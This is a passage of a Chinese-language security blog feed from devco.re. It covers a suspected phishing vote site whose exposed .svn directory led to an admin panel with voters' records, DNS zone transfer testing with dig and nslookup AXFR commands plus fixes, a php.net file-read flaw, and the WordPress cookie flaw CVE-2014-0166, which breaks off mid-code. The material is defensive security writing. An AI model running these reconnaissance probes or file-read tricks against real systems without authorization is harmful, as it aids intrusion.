&lt;!-- more --&gt;

&lt;h3 id=&quot;站台內容&quot;&gt;站台內容&lt;/h3&gt;

&lt;p&gt;在夢中手滑打開了網頁，內容長得像這個樣子：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/2.vote.tw.am_votepage.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/2.vote.tw.am_votepage.png&quot; alt=&quot;核四投票站台頁面&quot; title=&quot;核四投票站台頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;看了真是非常的義憤填膺！馬上就想投下神聖的一票！但是忽然聽到周公指示說網站底下有奇怪的目錄，照著神諭一試，發現有 .svn 目錄跟 entries 檔！&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/3.svn_entries.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/3.svn_entries.png&quot; alt=&quot;.svn 目錄&quot; title=&quot;.svn 目錄&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;這時候三太子哪吒剛好路過，說他剛剛在 Pastebin 看到有人貼了&lt;a href=&quot;http://pastebin.com/4iEVWh24&quot;&gt;一篇跟這個網站好像有關聯的內容&lt;/a&gt;，講完他就開著水車跑去鎮壓龍宮了。點開那篇內容一看，內容有一些很奇怪的網址，讓人看了就很想點！隨便選了一個 http://vote.tw.am/2N9E6V4E5R4BABC0647469FF213F2D94A27FA/chose_vote.include.php 打開來看：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/4.vote.tw.am_homepage.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/4.vote.tw.am_homepage.png&quot; alt=&quot;投票項目&quot; title=&quot;投票項目&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;哇塞！原來從服貿就已經開始了呢！讓我們繼續點進去看看：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/5.vote.tw.am_navigation.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/5.vote.tw.am_navigation.png&quot; alt=&quot;投票結果導覽頁面&quot; title=&quot;投票結果導覽頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;看起來是個後台，可以瀏覽使用者的投票記錄、留言等資料，那就點個投票記錄來看看：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/6.vote.tw.am_vote_record.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/6.vote.tw.am_vote_record.png&quot; alt=&quot;投票記錄&quot; title=&quot;投票記錄&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;果然裡面存著眾多民眾的投票記錄，那麼用戶反饋應該就是留言了…&lt;/p&gt;

&lt;p&gt;從這些內容看來，應該是有個集團擁有大量的民眾個資，並且一一發送訊息給這些人，背後目的尚不得而知。有可能是大陸人想利用這個熱潮確認這些電話號碼是否真實、可用，也有可能是不知名的黑手正在策劃下一個打壓動作？正當我們想搞清楚對方究竟是透過電話號碼還是信箱傳送 iMessage 時，哪吒忽然又路過了，丟了這張圖之後叫我們不要再瞎忙了趕快回家洗洗睡：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/7.scam.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/7.scam.png&quot; alt=&quot;IP、時間、電話、回應內容等資料&quot; title=&quot;IP、時間、電話、回應內容等資料&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;果然有電話！究竟這件事，是有網站大量洩漏個資，還是有人在民運期間利用這股熱潮蒐集個資，抑或是背後有什麼不可告人的秘密呢？讓我們繼續看下去～&lt;/p&gt;

&lt;h3 id=&quot;夢醒時分&quot;&gt;夢醒時分&lt;/h3&gt;

&lt;p&gt;上班時間不能午睡太久，於是周公就把我們叫醒了…..&lt;/p&gt;

&lt;p&gt;對於這樣的夢境我們有以下建議：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;不要隨意點擊來路不明的簡訊內容&lt;/li&gt;
  &lt;li&gt;在網路上填寫任何內容之前先查證該網站是否可疑&lt;/li&gt;
  &lt;li&gt;對於 yijapperj@hotmail.com 這種可疑帳號所傳來的任何資料，請保持高度警戒&lt;/li&gt;
  &lt;li&gt;對於 vote.tw.am 這種看起來疑似要偽裝成 .tw 網域的站台，也請保持高度警戒&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;歡迎大家轉發這個消息到各大網站、粉絲團、BBS，告訴各個熱心公益的鄉民們別再點擊與回應來路不明的簡訊囉！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/05/07/vote.tw.am-potential-phishing-site/</link>
                <guid>https://devco.re/blog/2014/05/07/vote.tw.am-potential-phishing-site</guid>
                <pubDate>Wed, 07 May 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Zone Transfer CVE-1999-0532 - 古老的 DNS 資安議題</title>
                <description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Domain_Name_System&quot;&gt;DNS&lt;/a&gt; 是在 1983 年由 Paul Mockapetris 所發明，相關規範分別在 &lt;a href=&quot;http://tools.ietf.org/html/rfc1034&quot;&gt;RFC 1034&lt;/a&gt; 以及 &lt;a href=&quot;http://tools.ietf.org/html/rfc1035&quot;&gt;RFC 1035&lt;/a&gt;。其主要作用是用來記憶 IP 位址與英文之間的對應關係，讓人類可以用較簡單的方式記得主機名稱。目前一般民眾大多使用 ISP 或國際知名公司提供的 DNS server，如中華的 168.95.1.1 或是 Google 的 8.8.8.8 等等。&lt;/p&gt;

&lt;p&gt;然而對於企業而言，可能需要架設大量機器或內部系統，又希望以簡單的方式記憶主機名稱，因此許多企業有自行架設 DNS server 的需求。同時企業通常也會建立幾台備援 DNS server，以避免 DNS 服務忽然中斷。但是當企業有多台 DNS server 時，就必須考量 DNS 記錄的同步問題，通常會使用 &lt;a href=&quot;http://en.wikipedia.org/wiki/DNS_zone_transfer&quot;&gt;zone transfer&lt;/a&gt; 這個功能來同步記錄。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;然而若管理者未做好相關設定，使所有來源皆可對企業的 DNS 主機進行 zone transfer 查詢，則有機會讓此功能成為企業遭受攻擊的起點。用現實生活情境舉例的話，對外開放 zone transfer 就如同所有人都可以任意查詢你名下的所有房地產位在何處，假如有人要針對性的攻擊你，隨時都可以去看你某個房地產有沒有哪扇門窗沒關好，伺機入侵你的家園。一般我們對企業資訊系統進行&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;滲透測試&lt;/a&gt;時，在資訊搜集的階段也會先從 domain name 下手，因此 DNS 相關資料的重要性可見一斑。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-1999-0532&quot;&gt;Zone transfer 的資安議題早在 1999 年就已有人提出&lt;/a&gt;，理應成為各企業進行資安稽核的步驟之一。然而十五年過去了，在近期我們卻發現許多國內大企業仍有此問題，令人非常驚訝！究竟企業該如何檢測自身是否存在這種安全漏洞？此問題目前在台灣網路環境佔有多大的比例？Zone transfer 會對企業造成什麼影響？讓我們繼續看下去～&lt;/p&gt;

&lt;h3 id=&quot;zone-transfer-檢測方式&quot;&gt;Zone Transfer 檢測方式&lt;/h3&gt;

&lt;p&gt;首先需感謝 &lt;a href=&quot;http://www.digininja.org/&quot;&gt;DigiNinja&lt;/a&gt; 提供了一個&lt;a href=&quot;http://www.digininja.org/projects/zonetransferme.php&quot;&gt;讓大家自由測試的 zonetransfer.me 網域&lt;/a&gt;，以下我們分別在 Linux 及 Windows 環境下進行檢測。&lt;/p&gt;

&lt;h4 id=&quot;linux&quot;&gt;Linux&lt;/h4&gt;

&lt;p&gt;在 Linux 環境內，我們可利用 &lt;a href=&quot;http://linux.vbird.org/linux_server/0350dns.php#dig&quot;&gt;dig&lt;/a&gt; 指令查詢目標 domain 使用哪些 name server：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;dig +nostats +nocomments +nocmd NS zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Name server 查詢結果：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;zonetransfer.me.		IN	NS
zonetransfer.me.	7118	IN	NS	ns12.zoneedit.com.
zonetransfer.me.	7118	IN	NS	ns16.zoneedit.com.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;從結果可得知有 ns12.zoneedit.com 或 ns16.zoneedit.com 這兩個 DNS server，接著我們即可測試是否可從外部網路對這兩個 DNS server 進行 zone transfer，測試方式如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;dig axfr zonetransfer.me @ns12.zoneedit.com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Zone transfer 測試結果：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/linux-zone-transfer-result.jpg&quot; title=&quot;使用 dig 測試網域是否存在 zone transfer 漏洞&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/linux-zone-transfer-result.jpg&quot; alt=&quot;使用 dig 測試網域是否存在 zone transfer 漏洞&quot; title=&quot;使用 dig 測試網域是否存在 zone transfer 漏洞&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;從上面的測試結果中我們可發現，zonetransfer.me 這個網域的所有 DNS 設定已全部被列出。&lt;/p&gt;

&lt;h4 id=&quot;windows&quot;&gt;Windows&lt;/h4&gt;

&lt;p&gt;若是在 Windows 環境，可在命令提示字元環境內使用 &lt;a href=&quot;http://support.microsoft.com/kb/200525/zh-tw&quot;&gt;nslookup&lt;/a&gt; 指令查詢目標 domain 使用哪些 name server：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nslookup -type&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ns zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Name server 查詢結果：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Server:		8.8.8.8
Address:	8.8.8.8#53

Non-authoritative answer:
zonetransfer.me	&lt;span class=&quot;nv&quot;&gt;nameserver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ns12.zoneedit.com.
zonetransfer.me	&lt;span class=&quot;nv&quot;&gt;nameserver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ns16.zoneedit.com.

Authoritative answers can be found from:&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;輸入指令後我們如同先前使用 dig 一樣，得知目標有 ns12.zoneedit.com 與 ns16.zoneedit.com 這兩個 name server，接著再如下圖依序輸入三道指令查詢：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nslookup

server ns12.zoneedit.com

ls -d zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;註：Linux 版的 nslookup 沒有實作 ls 這個功能喔！&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Zone transfer 測試結果：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/windows-zone-transfer-result.jpg&quot; title=&quot;使用 nslookup 測試網域是否存在 zone transfer 漏洞&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/windows-zone-transfer-result.jpg&quot; alt=&quot;使用 nslookup 測試網域是否存在 zone transfer 漏洞&quot; title=&quot;使用 nslookup 測試網域是否存在 zone transfer 漏洞&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;測試結果與 Linux 環境所得到的資料雷同，可成功列出該網域的所有 DNS 設定。&lt;/p&gt;

&lt;h4 id=&quot;online-service&quot;&gt;Online Service&lt;/h4&gt;

&lt;p&gt;當然，並不是每個人都熟悉上述指令的操作方式，因此除了介紹手動檢測方法之外，在這裡也提供幾個線上檢測的服務，讓大家可以迅速檢測自家公司或者你正在使用的服務是否有此問題：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.ultratools.com/tools/zoneFileDump&quot;&gt;UltraTools&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://hackertarget.com/zone-transfer/&quot;&gt;HackerTarget&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://tools.digitalpoint.com/zone-transfer&quot;&gt;Digital Point&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;實際案例&quot;&gt;實際案例&lt;/h3&gt;

&lt;p&gt;如同上次 &lt;a href=&quot;http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP Headers 資安議題&lt;/a&gt;所探討的對象，我們從 TIEA 成員以及 Alexa TW top 525 觀察 zone transfer 問題分別在這些族群中佔有多少比例。&lt;/p&gt;

&lt;p&gt;根據我們監測的結果，在目前 TIEA 的 132 名成員中，有 20 個網域存在 zone transfer 問題，佔了 15.15%。而在 Alexa TW top 525 當中，有 48 個網域存在 zone transfer 問題，佔了 9.14%。乍看之下比率似乎不高，但是在上述兩個族群的網域當中，包括：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;電信商&lt;/li&gt;
  &lt;li&gt;多家電視媒體&lt;/li&gt;
  &lt;li&gt;多家網路新聞媒體&lt;/li&gt;
  &lt;li&gt;多家線上購物網站&lt;/li&gt;
  &lt;li&gt;知名團購網站&lt;/li&gt;
  &lt;li&gt;知名金流公司&lt;/li&gt;
  &lt;li&gt;知名線上音樂服務&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;台灣企業不夠注重資訊安全，罔顧客戶資料安全性，早已不是新聞。然而若企業不顧自身商業利益與責任，當彼此無商業往來時，我們也無法一一咎責。但若連台北市政府、教育部、多間大專院校都有此問題，就令人不太能接受了，這些政府單位與教育機構理當為我們的個人資料安全性負起全部的責任，不應該漏掉任何一個資安環節。上述結果顯示出台灣從政府到企業可能都沒有徹底落實 DNS 的資安設定，而且目前的數據僅僅是針對 TIEA 成員以及 Alexa TW top 525 進行檢測，若是對全台灣或是全世界進行大範圍的檢測，恐怕會發現更多驚人的案例！&lt;/p&gt;

&lt;h3 id=&quot;對企業的潛在影響&quot;&gt;對企業的潛在影響&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;洩漏網域名稱&lt;/p&gt;

    &lt;p&gt;一般企業在進行&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;滲透測試&lt;/a&gt;時，通常只會挑幾個最重要、最常面對客戶的網域進行測試，但是入侵者可不會這麼乖。當有人嘗試要入侵企業時，必定是先進行全面的偵查，觀察企業哪幾個網域所執行的 service 有潛在的弱點，或是看哪幾個網域防禦力道較弱，再從該處下手。因此 zone transfer 問題所提供的完整 DNS 記錄，就為入侵者省下了許多偵查的工夫。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;洩漏外網 IP 範圍&lt;/p&gt;

    &lt;p&gt;當攻擊者取得 zone transfer 所洩漏的資料後，可合理推斷哪些網段是屬於該企業，進一步對該網段進行掃描，嘗試找尋有機會入侵之標的物。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;洩漏內網 IP 範圍&lt;/p&gt;

    &lt;p&gt;有些管理人員、開發者為求內部開發方便，經常會將網域名稱跟內網 IP 位址綁在一起，例如將 phpmyadmin.example.com 設定為 192.168.1.100，攻擊者就可根據此類資訊猜測內網哪些網段存在重要服務。這種設定平常也許不會造成重大損害，但是當管理者疏於建立內網防禦機制，恰好企業又被入侵至內網時，造成一連串重大損失的機率將會大幅提高。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;解決方式&quot;&gt;解決方式&lt;/h3&gt;

&lt;h4 id=&quot;linux-1&quot;&gt;Linux&lt;/h4&gt;

&lt;p&gt;若使用 Linux，可在 /etc/named.conf 內加入下列選項，以限制可存取 zone transfer 的來源：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;options &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    allow-transfer &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        1.2.3.4&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        5.6.7.8&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;設定完畢後，將 DNS 服務重啟即可生效。&lt;/p&gt;

&lt;h4 id=&quot;windows-1&quot;&gt;Windows&lt;/h4&gt;

&lt;p&gt;在 Windows server 當中，我們可到伺服器管理員修改網域的相關設定，如下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-1.png&quot; title=&quot;於伺服器管理員修改網域的 zone transfer 設定&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-1.png&quot; alt=&quot;於伺服器管理員修改網域的 zone transfer 設定&quot; title=&quot;於伺服器管理員修改網域的 zone transfer 設定&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在伺服器管理員中，選定想要修改的網域（此處以 test.com 為例），按右鍵點選內容，將會跳出選單如下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-2.png&quot; title=&quot;修改 test.com 的 zone transfer 設定&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-2.png&quot; alt=&quot;修改 test.com 的 zone transfer 設定&quot; title=&quot;修改 test.com 的 zone transfer 設定&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;接著就是觀看「允許區域轉送」選項是否有勾選，若已勾選，則確認轉送對象是否為下列兩種：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;只到列在「名稱伺服器索」引標簽上的伺服器&lt;/li&gt;
  &lt;li&gt;只到下列伺服器&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;tcp-53-port&quot;&gt;TCP 53 port&lt;/h4&gt;

&lt;p&gt;DNS 在做 zone transfer 時是使用 TCP 53 port（有別於一般 DNS query 的 UDP 53 port），因此有些人會認為將 TCP 53 port 關閉就可以對付 zone transfer，而不想修改 zone transfer 的設定。其實這個觀念只對了一半，若 zone file 的資料小於 512 byte，仍然可以透過 UDP 傳輸。即使 zone file 的資料大於 512 byte，&lt;a href=&quot;http://securityweekly.com/2011/11/incremental-zone-transfers-for.html&quot;&gt;也可以用 Incremental Zone Transfer (IXFR) 的方式取得部分資料&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;如果企業今天非常有自信能夠替所有網域都準備好完善的安全措施，那麼 zone transfer 所洩漏的資料對該企業就不會有太嚴重的影響。然而，在現今這個入侵手法日新月異的世界裡，又有誰能夠永遠保證自己的安全防護已經做足了呢？在前陣子火紅的 &lt;a href=&quot;http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/&quot;&gt;OpenSSL CVE-2014-0160 Heartbleed&lt;/a&gt; 問題被爆出來之後，我們就藉由許多 zone transfer 的記錄觀察到全世界有非常多企業只修復了主要網站的 OpenSSL 漏洞，卻忽略了企業內其他的服務與設備可能也有此漏洞，像是 DB、Email、VPN、NAS 等等，直到今日仍遲遲未修復。&lt;/p&gt;

&lt;p&gt;千萬別以為你所購買的各種資安設備能防禦所有資安弱點，也別忽略了各項古老的資安弱點，更別小看了你所不熟悉的駭客們的組合各式各樣弱點的能力，只要有一個資安環節疏漏，隨時都有可能對企業造成致命危機。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/</link>
                <guid>https://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue</guid>
                <pubDate>Mon, 05 May 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>PHP 官網原始碼讀取案例</title>
                <description>&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References&quot;&gt;不安全的引用物件 (Insecure Direct Object Reference)&lt;/a&gt; 是個非常常見的資安漏洞，在 &lt;a href=&quot;https://www.owasp.org/&quot;&gt;OWASP&lt;/a&gt; 公布的&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-Top_10&quot;&gt;十大網站應用程式安全漏洞&lt;/a&gt; 中高居第四名。通常發生在網站應用程式上沒有針對輸入的參數做好檢查，就把參數丟入 include 或 readfile 等函數當中引用，使得攻擊者可以藉此存取任意文件的原始碼。&lt;/p&gt;

&lt;p&gt;今天這個案例就發生在 PHP 的官方網站 (&lt;a href=&quot;http://www.php.net/&quot;&gt;http://www.php.net/&lt;/a&gt;)，消息來源是知名的 0-Day 黑市 1337day，發佈的日期是 2014/4/4 ，原始的內容是這樣的：&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_00_1337day.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_00_1337day.png&quot; alt=&quot;1337day 漏洞交易網站&quot; title=&quot;1337day 漏洞交易網站&quot; /&gt;&lt;br /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;可以看到這個弱點是不公開的，想要知道內容的話要支付 82 美元相當於新台幣 3500 元呢！在強烈的好奇心屈使之下，自己打開工具來找看看：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_01_source_code.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_01_source_code.png&quot; alt=&quot;PHP 官方網站原始碼&quot; title=&quot;PHP 官方網站原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;透過簡單的分析和一點點運氣，找到了 「&lt;a href=&quot;http://www.php.net/cached.php&quot;&gt;http://www.php.net/cached.php&lt;/a&gt;」 這隻程式，發現它傳入了「t」和「f」這兩個參數。「t」直覺上就是個 rand 數值，而「f」應該就是檔案位置了。這時候對 f 參數小小修改一下，神奇的事情發生了：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_02_cached.php.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_02_cached.php.png&quot; alt=&quot;cached.php 讀取原始碼&quot; title=&quot;cached.php 讀取原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;index.php 的原始碼被完整的讀出來，當然也要來看一下 cached.php 是怎麼寫的：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_03_cached.php_view_source.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_03_cached.php_view_source.png&quot; alt=&quot;cached.php 檢視原始碼&quot; title=&quot;cached.php 檢視原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;可以看到此處並未對 $_GET[“f”] 進行檢查，所以修改了 $_GET[“f”] 後，與 $abs 組合完，最後就直接丟入 readfile 讀取檔案。比較值得研究的是這邊使用了 realpath 與 strncmp 來比較 f 及 DOCUMENT_ROOT，確保 $abs 只能在網站目錄之下，所以無法使用 ../../ (&lt;a href=&quot;https://www.owasp.org/index.php/Path_Traversal&quot;&gt;Path Traversal&lt;/a&gt;) 的方式跳脫目錄進行更進一步的滲透。&lt;/p&gt;

&lt;p&gt;最後我們將此發現回報給 security@php.net ，得到的回應是他們是「故意的 (intentional)」。且後來也知道 PHP 官網是開放原始碼（Open Source）的，可以到 &lt;a href=&quot;http://git.php.net/?p=web/php.git;a=tree&quot;&gt;http://git.php.net/?p=web/php.git;a=tree&lt;/a&gt; 下載整個官網的原始碼。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_04_php_team_response.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_04_php_team_response.png&quot; alt=&quot;PHP.NET 官網團隊回應&quot; title=&quot;PHP.NET 官網團隊回應&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;雖然在這個案例中並沒有造成實質上的危害，沒有帳號、密碼、系統設定等機敏資料，但若把此種寫法用在其他地方，則可能造成很大的資安風險。就連 PHP 官方網站都有這樣的失誤，身為開發人員的你們更不可不慎！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/24/php.net-insecure-direct-object-reference/</link>
                <guid>https://devco.re/blog/2014/04/24/php.net-insecure-direct-object-reference</guid>
                <pubDate>Thu, 24 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>CVE-2014-0166 WordPress 偽造 Cookie 弱點</title>
                <description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;在一陣 OpenSSL Heartbleed 淘金潮中，又有一個技術門檻低、後果嚴重、也同樣需要些運氣的漏洞被揭發－&lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0166&quot;&gt;CVE-2014-0166&lt;/a&gt;。CVE-2014-0166 是 WordPress 上面驗證登入 cookie 的弱點，攻擊者可以暴力偽造出合法 cookie，藉此獲得 WordPress 最高權限，進而拿到 shell 取得系統操作權。&lt;br /&gt;
讓我們來分析一下這次的弱點是發生了什麼事吧！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;解析&quot;&gt;解析&lt;/h3&gt;

&lt;p&gt;這次出問題的程式碼在&lt;a href=&quot;https://github.com/WordPress/WordPress/blob/684145ca8101e9ba5d9b4516709121fbe0fb9aee/wp-includes/pluggable.php#L650&quot;&gt;這邊&lt;/a&gt;，關鍵程式碼如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;wp_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pass_frag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;|&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$expiration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$scheme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash_hmac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;md5&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;|&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$expiration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$hmac&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
